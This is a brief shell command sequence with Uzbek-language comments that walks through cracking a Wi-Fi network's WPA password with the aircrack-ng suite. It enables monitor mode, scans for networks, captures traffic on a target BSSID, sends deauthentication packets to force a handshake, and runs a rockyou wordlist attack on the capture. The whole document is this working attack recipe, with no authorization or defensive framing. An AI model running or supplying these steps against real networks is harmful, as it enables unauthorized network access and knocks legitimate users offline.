# Monitor rejimiga o'tkazish
sudo airmon-ng start wlan0

# Tarmoqlarni skanerlash
sudo airodump-ng wlan0mon

# Qo'lga olish
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# Handshake olish
sudo aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

# Parolni kraking
sudo aircrack-ng -w wordlists/rockyou.txt capture-01.cap